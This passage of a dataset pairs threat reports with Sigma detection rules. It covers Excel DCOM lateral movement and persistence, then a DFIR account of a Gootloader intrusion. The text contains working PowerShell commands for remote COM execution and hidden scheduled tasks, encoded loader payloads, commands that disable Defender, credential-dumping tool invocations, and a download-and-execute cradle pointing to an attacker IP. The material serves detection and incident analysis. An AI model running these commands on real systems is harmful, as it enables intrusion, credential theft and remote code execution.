MethodCountCouldNotFindBest\n```\n\nAlternatively, we could use CLSID instead of ProgID to identify the Excel COM class object. Please note that CLSID can differ between various versions of Excel.\n\n```\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID(\"00020812-0000-0000-C000-000000000046\",\"192.168.49.160\"))\n\n$com.application.ActivateMicrosoftApp(\"5\")\n```\n\nThis technique is not limited to Microsoft FoxPro (*FOXPROW.exe* corresponds to **xlMicrosoftFoxPro** or **5**), but other legacy applications such as Microsoft Schedule Plus (*SCHDPLUS.exe* corresponds to **xlMicrosoftSchedulePlus** or **7**) and Project (*WINPROJ.exe* corresponds to **xlMicrosoftProject** or **6**) can be abused as well.\n\nTo automate this attack, check out SharpExShell.\n\n## Persistence\n\nThis technique could be used for persistence once we have established a foothold on a machine that has Microsoft Office installed. First, develop a PowerShell script that initializes an instance of the Excel.Application object via DCOM and invokes the **ActivateMicrosoftApp()** method on the localhost. Then, create a scheduled task configured to run at specific intervals, which will execute the PowerShell script we created. Ultimately, ensure that *FOXPROW.exe* is placed within the system *PATH* and wait for the scheduled task to execute.\n\n```\nPS C:\\Users\\User\\Desktop> cat .\\ExcelPersistence.ps1\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n$com.ActivateMicrosoftApp(\"5\")\n\nPS C:\\Users\\User\\Desktop> copy C:\\windows\\system32\\calc.exe C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\foxprow.exe\n\nPS C:\\Users\\User\\Desktop> schtasks /create /tn ExcelPersistence /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'C:\\users\\user\\desktop\\ExcelPersistence.ps1'\" /sc onidle /i 5\n\nPS C:\\Users\\User\\Desktop> schtasks.exe /run /tn ExcelPersistence\n```\n\n```image\nAlt: Figure 07 — Create Persistence via ActivateMicrosoftApp() method\nDescription: The image shows a PowerShell terminal with a dark background, displaying commands related to creating persistence via the ActivateMicrosoftApp() method in a Windows environment. The terminal is positioned on a desktop that includes various application icons and a taskbar at the bottom. The commands are executing scripts that involve initializing an instance of the Excel.Application object, copying a file to a specific directory, and creating a scheduled task to run a PowerShell script at specified intervals.\nTranscription: |\n  PS C:\\Users\\User\\Desktop> cat .\\ExcelPersistence.ps1\n  $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n  $com.ActivateMicrosoftApp(\"5\")\n  \n  PS C:\\Users\\User\\Desktop> copy C:\\windows\\system32\\calc.exe C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\foxprow.exe\n  \n  PS C:\\Users\\User\\Desktop> schtasks /create /tn ExcelPersistence /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'C:\\users\\user\\desktop\\ExcelPersistence.ps1'\" /sc onidle /i 5\n  \n  PS C:\\Users\\User\\Desktop> schtasks.exe /run /tn ExcelPersistence\n```\n\n## Post Exploitation\n\nOnce we have compromised *Domain Admin* within a network, this technique grants us the ability to establish a reverse shell on any workstation where Microsoft Office is installed in a non-traditional way. Since administrators have write privileges to the C:\\Program Files\\Microsoft Office\\Office16 directory, we can upload our malicious file there or in any other folder within the system *PATH*.\n\n**Note**: The initial location where the **ActivateMicrosoftApp()** method searches for *FOXPROW.exe* is within the C:\\Program Files\\Microsoft Office\\root\\Office16 folder.\n\n## Impact\n\nThis technique can have a significant impact since it allows attackers to execute malicious executable on any machine that has Microsoft Office installed, given administrative rights to that machine. It could be abused by attackers in a ransomware scenario. The malicious actor has the capability to upload malware, place it within the *PATH*, and then run the malware by executing the **ActivateMicrosoftApp()** method.\n\n## Detection\n\nIn general, DCOM security is a bit challenging because there are many applications that support DCOM models for re-usability and each application requires its own security configuration. DCOM also maintains its own set of access control lists (ACLs) which define the users or groups that have access to a component of a certain class. Additionally, DCOM utilizes Windows authentication mechanisms like NTLM or Kerberos.\n\nEach application component has its own permissions (e.g., users that are allowed to launch and activate the COM server, users that have access permission, users that have component configuration permission, etc.). The biggest complication is that a user might be blocked from accessing Microsoft Excel COM class objects but has privileges to access Microsoft Word COM class objects. This can complicate DCOM security within an enterprise environment, but there are few actions we could take to detect and mitigate this attack.\n\nTo detect this attack, defenders can look for a child process spawning off of *Excel.exe*. If the following processes are spawned as a child process of *Excel.exe*, then you should investigate further:\n\n- FOXPROW.exe\n- SCHDPLUS.exe\n- WINPROJ.exe\n\n```image\nAlt: Figure 08 — Excel.exe spawned FOXPROW.exe as its child process\nDescription: The image displays a screenshot from a process monitoring tool, showing a list of running processes on a Windows system. Notably, 'EXCEL.EXE' is highlighted, indicating it has spawned a child process named 'foxpro.exe'. The screenshot includes details such as CPU usage, private bytes, working set size, process ID (PID), description, and company name for each process. This visual representation is relevant for detecting lateral movement via DCOM abuse in the context of security and threat analysis.\nTranscription: |\n  Process                       CPU       Private Bytes   Working Set   PID    Description                         Company Name\n  csrss.exe                     1.856 K   6,088 K         6,088 K       640    Client/Server Runtime Subsystem     Microsoft Corporation\n  wininit.exe                   1.332 K   7,116 K         7,116 K       640    Windows Initialization Process      Microsoft Corporation\n  services.exe                  1.332 K   7,716 K         7,716 K       640    Services and Controller app         Microsoft Corporation\n  svchost.exe                   < 0.01    27,352 K        27,352 K      920    Host Process for Windows Services   Microsoft Corporation\n  WmiPrvSE.exe                  < 0.01    73,164 K        104,024 K     3738   Microsoft Excel                     Microsoft Corporation\n  SearchHost.exe                1.856 K   6,088 K         6,088 K       640    Windows Search Experience Host      Microsoft Corporation\n  StartMenuExperienceHost.exe   < 0.01    3,496 K         15,848 K      712    Start Menu Experience Host          Microsoft Corporation\n  RuntimeBroker.exe             1.332 K   7,716 K         7,716 K       640    Runtime Broker                      Microsoft Corporation\n  ShellExperienceHost.exe       1.332 K   7,716 K         7,716 K       640    Windows Shell Experience Host       Microsoft Corporation\n  ApplicationFrameHost.exe      1.332 K   7,716 K         7,716 K       640    Application Frame Host              Microsoft Corporation\n  SystemSettingsBroker.exe      1.332 K   7,716 K         7,716 K       640    System Settings Broker              Microsoft Corporation\n  SDXHelper.exe                 1.332 K   7,716 K         7,716 K       640    Microsoft Office SDX Helper         Microsoft Corporation\n  dllhost.exe                   1.516 K   7,716 K         7,716 K       640    COM Surrogate                       Microsoft Corporation\n  RuntimeBroker.exe             1.332 K   7,716 K         7,716 K       640    Runtime Broker                      Microsoft Corporation\n```\n\nAnother detection method involves monitoring for network anomalies. For instance, if RPC communication between two machines is unusual within your environment, you might want to investigate it further.\n\nTo learn more about security of DCOM read here.\n\n## Mitigation\n\nTo mitigate this attack, consider configuring the user identity located under Component Services > Computers > My Computer > DCOM Config > Microsoft Excel Application > Properties. There are three options available:\n\n- The interactive user — runs Excel as the currently logged on user’s security context\n- The launching user — runs Excel under the security context of the user launching it\n- This user — runs Excel under a specific user’s security context\n\nConfigure the “This user” option to a user with minimal privilege. Since attackers will now have to jump another hop to escalate privileges, this dramatically reduces the potential impact.\n\n```image\nAlt: Figure 09 — Configure This user to minimize the attack impact\nDescription: The image shows the 'Microsoft Excel Application Properties' dialog box displaying options for configuring user accounts for running the application. It highlights the 'This user' option, which allows for specifying a user account, with fields for 'User', 'Password', and 'Confirm password'. The context supports the need for configuring DCOM settings for Microsoft Excel to mitigate lateral movement attacks, emphasizing the importance of using a user with minimal privileges.\nTranscription: |\n  Microsoft Excel Application Properties\n  \n  General | Location | Security | Endpoints | Identity\n  \n  Which user account do you want to use to run this application?\n  \n  ( ) The interactive user.\n  ( ) The launching user.\n  (X) This user.\n      User: IRONMAN\\john\n      Password: [__________]\n      Confirm password: [__________]\n  ( ) The system account (services only).\n  \n  Learn more about setting these properties.\n  \n  [ OK ] [ Cancel ] [ Apply ]\n```\n\nLastly, the concept of least privilege should be applied to limit the number of local administrators with access to workstations and servers, thus decreasing the chance of an attacker successfully being able to upload malware.",
    "sigma_rule": {
      "title": "Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp",
      "id": "551d9c1f-816c-445b-a7a6-7a3864720d60",
      "status": "test",
      "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n",
      "references": [
        "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
        "https://github.com/grayhatkiller/SharpExShell",
        "https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication"
      ],
      "author": "Aaron Stratton",
      "date": "2023-11-13",
      "tags": [
        "attack.t1021.003",
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\excel.exe"
        },
        "selection_child": [
          {
            "OriginalFileName": [
              "foxprow.exe",
              "schdplus.exe",
              "winproj.exe"
            ]
          },
          {
            "Image|endswith": [
              "\\foxprow.exe",
              "\\schdplus.exe",
              "\\winproj.exe"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_excel_dcom_lateral_movement.yml",
    "id": "319"
  },
  {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story\n\n**Categories:** \ncobaltstrike \ngootloader \nlazagne \npsexec\n\n**Published on:** \nMay 9, 2022\n\n---\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\nGootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left with a forum-looking web page where the user is instructed to download a file, which they accidentally execute (double click to open). You can learn more about Gootloader by reading these references: \n1. [“Gootloader” expands its payload delivery options](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\n2. [Gootloader: ‘Initial Access as a Service’ Platform Expands Its Search for High Value Targets](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/)\n3. [Gootloader](https://redcanary.com/threat-detection-report/threats/gootloader/)\n4. [Gootloader’s “mothership” controls malicious content](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\nThe researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!\n\n```image\nAlt: Gootloader Infrastructure\nDescription: The image consists of a series of tweets from the account @GootLoaderSites, detailing current sites associated with the Gootloader malware. Each tweet mentions specific URLs that are serving malicious content, indicating the presence of malware on those sites. The tweets also express a willingness to assist affected parties in cleaning up their sites, highlighting ongoing monitoring and reporting efforts related to Gootloader's operations.\nTranscription: |\n  plaintext\n  GootLoader Sites @GootLoaderSites · Apr 16\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.jlfwealth.com/forum.php\n  \n  GootLoader Sites @GootLoaderSites · Apr 17\n  @JLFwealth FYI your site is delivering malware. Please let me know if you need help cleaning it up, DMs are open.\n  \n  GootLoader Sites @GootLoaderSites · Apr 15\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.joskel.nl/forum.php\n```\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile, on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline outlining the events of a cyber incident involving SEO poisoning and the Gootloader malware. It categorizes events by time and provides specific actions taken during the attack, such as 'Gootloader Execution,' 'Lateral Movement,' 'Mimikatz Execution,' and 'RDP Connections.' Each entry includes timestamps in UTC and descriptions of the executed commands, tools used, and affected systems. This structured format allows for easy tracking of the attack progression over two days.\nTranscription: |\n  plaintext\n  SEO Poisoning - A Gootloader Story\n  \n  Day 1\n  \n  14:43 UTC Gootloader Execution\n  - WScript.exe olympus.plex.agreement 34603.js\n  - kaiokok.adspardev.com 35.200.117.64:443\n  - Cobalt Strike loaded into memory\n  - 146.70.78.43:443\n  \n  15:00 UTC Lateral Movement from Beachhead Host to Workstation #1 and Disabling of Defender\n  - Via PowerShell Remote Service\n  - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADA...\n  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true\n  - 146.70.78.43:443\n  \n  15:34 UTC Antivirus Check on Beachhead Host\n  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n  \n  14:58 UTC Discovery via Bloodhound\n  - Invoke-BloodHound -CollectionMethod All\n  \n  15:30 UTC Second Cobalt Strike Server on Workstation #1\n  - 37.120.198.225:443\n  \n  15:44 UTC Mimikatz Execution on Beachhead Workstation\n  - Invoke-Mimikatz\n  \n  15:48 UTC LaZagne Execution on Workstation #1\n  - ls.exe all -oN --output C:\\Users\n  \n  16:05 UTC RDP into Workstation #1 from Beachhead Host\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\n  - Microsoft Defender Scheduled Tasks Deleted\n  - C:\\Windows\\system32\\schtasks.exe /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  \n  16:38 - 17:01 UTC Lateral Movement to Three Additional User Workstations\n  - Remote Service Execution\n  - \\\\WORKSTATION\\ADMIN$\\abb6ca2.exe\n  \n  21:34 UTC RDP into Domain Controller from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Invoke-WMIMExec -Target DomainController -Domain domain.local -Username USER -Hash \"...\" -Command \"powershell.exe reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\" -verbose\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  - LaZagne dropped and executed: ls.exe all -oN --output C:\\Users\n  \n  21:49 UTC RDP into File Share Server from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  \n  21:53 UTC Documents accessed on File Share Server interactively using Wordpad.exe\n  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE \"C:\\shares\\STAFFFILE.docx\"\n  \n  Day 2\n  \n  07:36 UTC Advanced IP Scanner used to port scan network from Domain Controller\n  - C:\\Users\\USER\\AppData\\Local\\Temp\\\\\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\n  - Ports: 21,80,135,443,445,3389,8080,56133,58000,58157,58492,58682,60234,60464,64502\n  \n  07:45 UTC File Server SMB Shares accessed from Domain Controller\n  \n  7:54 UTC RDP Connection to Backup Server\n```\n\nAnalysis and reporting completed by @kostastsale, @iiamaleks, @pigerlin.\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.\n\n[GootLoader Download](https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed)\n\nThe Javascript file is then executed when double-clicked after the zip is opened.\n\n```image\nAlt: Execution\nDescription: The image depicts a screenshot of a software interface displaying a Windows Registry Editor. On the left side, there are various folders under the path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username', which include 'Phone', 'ShellUI', 'Pim', 'Poom', 'Remote Assistance', 'ScreenMagnifier', 'Sensors', and 'SkyDrive'. The right side shows a table with registry entries labeled '(default)' and indexed rows (0 to 7), containing values that appear to be obfuscated strings. This information is relevant to the analysis of the execution of Gootloader malware, suggesting a technical aspect of the malware's operation.\n```\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named `powershell.dll`.\n\n```image\nAlt: Registry Keys\nDescription: The image displays a screenshot of a Windows Registry Editor, showing the registry path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0'. It contains a list of registry values with associated data types and values. The left pane shows the key hierarchy, specifically the 'Phone' key and its subkeys, while the right pane details the values stored in 'Username0', indicating the presence of encoded data related to the Gootloader malware. This is relevant for understanding the malware's execution and persistence mechanisms.\nTranscription: |\n  Key name\n  HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n  \n  Value Name    Value Type    Data\n  (default)     RegSz         \n  0             RegSz         4d5a90000300000004000000ffff0000b8000...\n  1             RegSz         65a6a586d280700002b0d0012037b1b0004a...\n  2             RegSz         00006e282900000a00120209281e00000a7d...\n  3             RegSz         7f01140003004c250000000000086008b011...\n  4             RegSz         64e616d654f7264696e616c730048696e740...\n  5             RegSz         e33320526567697374727920790052656773...\n  6             RegSz         000000000000000000000000000000000000...\n```\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a table summarizing key event details related to a cybersecurity incident. It includes columns for 'EventCode', 'TaskCategory', 'ParentCommandLine', and 'CommandLine'. The 'Process Create' event shows the execution of 'C:\\Windows\\System32\\WScript.exe' and a PowerShell command executing a potentially encoded payload from a specified file path.\nTranscription: |\n  plaintext\n  EventCode   TaskCategory       ParentCommandLine                                                                                                          CommandLine\n  1           Process Create     \"C:\\Windows\\System32\\WScript.exe\"                                                                                          \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\"\n              (rule:             \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\Temp1_olympus plea agreement(46196).zip\\olympus_plea_agreement 34603.js\"            NgAxA\"DQANgA0ADkA\"MgAxADEA0WB\"zAGwAZQBlAHAAIAAtAHMAIAAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQB5AHQ\"AZQBtAFAA\"cg\"B\"vAHAaZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaA\n              ProcessCreate)\n```\n\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"...\n```\n\nThe PowerShell command will extract the .NET loader from `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0` and execute the code in memory via `Assembly.Load()`.\n\nThis CyberChef recipe can be used to decode the related PS encoded payload.\n\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username` and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n\nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n\n```\nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n```\n\n```image\nAlt: .NET Loader\nDescription: The image depicts a code snippet written in C#. It outlines a method for reading encoded data from the Windows registry, decoding it, and loading it into memory for execution. The code includes comments and structured sections labeled as '1. Read encoded data from registry,' '2. Decode data,' and '3. Load into memory and run.' The use of specific classes like `RegistryKey` and `Open.DynamicDllLoader` indicates a focus on manipulating system resources, typical in the context of cyber threat intelligence.\nTranscription: |\n  csharp\n  // Token: 0x60000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304\n  public static string Test()\n  {\n      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Phone\\\\\" +\n          Environment.UserName);\n      if (registryKey != null)\n      {\n          string text = \"\";\n          for (int i = 0; i < 99999; i++)\n          {\n              string text2 = \"\";\n              try\n              {\n                  text2 = registryKey.GetValue(i.ToString()).ToString();\n              }\n              catch\n              {\n              }\n              if (text2.Length == 0)\n              {\n                  break;\n              }\n              text += text2;\n          }\n          registryKey.Close();\n          \n          // 2. Decode data\n          text = text.Replace(\"q\", \"0\").Replace(\"v\", \"0\").Replace(\"w\", \"1\").Replace(\"r\", \"2\").Replace(\"t\", \"3\").Replace(\"y\", \"4\").Replace(\"u\", \"5\").Replace(\"i\", \"6\").Replace(\"o\", \"7\").Replace(\"p\", \"8\").Replace(\"s\", \"9\").Replace(\"g\", \"A\").Replace(\"h\", \"B\").Replace(\"j\", \"C\").Replace(\"k\", \"D\").Replace(\"l\", \"E\").Replace(\"z\", \"F\");\n          byte[] data = Open.STBA(text);\n          Open.DynamicDllLoader dynamicDllLoader = new Open.DynamicDllLoader();\n          bool flag = dynamicDllLoader.LoadLibrary(data);\n          Console.WriteLine(\"Loaded: \" + flag);\n          if (flag)\n          {\n              uint procAddress = dynamicDllLoader.GetProcAddress(\"mono_trace\");\n              Console.WriteLine(\"Handle: \" + procAddress);\n          }\n      }\n      Console.ReadKey();\n      return \"Install\";\n  }\n```\n\nThe below diagram summarizes the Gootloader initial execution.\n\n```image\nAlt: Execution Summary\nDescription: The image is a flowchart illustrating the execution process of the Gootloader. It outlines the steps involved, starting from the initial execution of the malicious script (`wscript.exe olympus_plea_agreement 34603.js`), which contacts the command and control (C2) servers to retrieve the payload. It details how the Gootloader writes a .NET loader and an encoded Cobalt Strike payload to the registry, and how the PowerShell command is executed to load the .NET loader. The diagram also highlights how the .NET loader subsequently reads and decodes the Cobalt Strike payload from the registry for execution.\nTranscription: |\n  plaintext\n  https://junk-bros.com\n  https://jp.imonitorsoft.com\n  https://kakiosk.adsparkdev.com\n  \n  wscript.exe olympus_plea_agreement 34603.js\n      Gootloader contacts C2 and pulls down payload\n  \n  powershell.exe\n      .NET loader read from registry and loaded in Powershell via Assembly.Load() using an encoded Powershell command\n      The same encoded Powershell command is added as a scheduled task to run on user logon\n  \n  .NET loader and encoded Cobalt Strike payload written to registry\n      .NET Loader -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n      Cobalt Strike -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n  \n  .NET Loader\n      .NET loader is executed which reads and decodes a Cobalt Strike payload from the registry\n      .NET loader loads and executes the Cobalt Strike payload\n```\n\nAn excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop `.js` files from executing, preventing this attack chain from ever getting off the ground.\n\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n```\n\n## Persistence\n\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a log entry or data table showing details of a process creation event related to a PowerShell command. It includes columns for EventCode, TaskCategory, ParentImage, and CommandLine. The CommandLine specifies a PowerShell script execution through the Windows Script Host (wscript.exe), indicating the use of encoded commands. This image provides technical insight into the execution of potentially malicious PowerShell commands, relevant for understanding cyber threats.\nTranscription: |\n  plaintext\n  EventCode: 1\n  TaskCategory: Process Create (rule: ProcessCreate)\n  ParentImage: C:\\Windows\\System32\\wscript.exe\n  CommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\" N\"g\"A4\"ADc\"ANgA4\"ADEAMwA7ACQAYQ\"A9ACIA\"TgB\"n\"AEEAeAB\"B\"AE\"Q\"AUQ\"BBAE\"4ZwBBADA\"AQ\"QBEAGsAQQ\"BNAGc\"AQDBA4\"EEARABF\"AE\"E\"AT\"w\"B3A\"ETIAegBB\"AEc\"AdvBBA\"F\"oAUQBC\"AGwA\"Q\"Q\"B\"IAEEAQ\"\n```\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n```\n\nThe task created from the PowerShell script:\n\n```image\nAlt: Scheduled Task\nDescription: The image displays an XML representation of a scheduled task created by a PowerShell script. The task is set to trigger when a specific user logs on. Key elements include the task's registration information, triggers, settings, actions, and user principal details. The XML schema indicates various properties such as logon type, execution parameters, and security context, which are relevant to the execution of the PowerShell command.\nTranscription: |\n  xml\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>\\</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId></UserId>\n      </LogonTrigger>\n    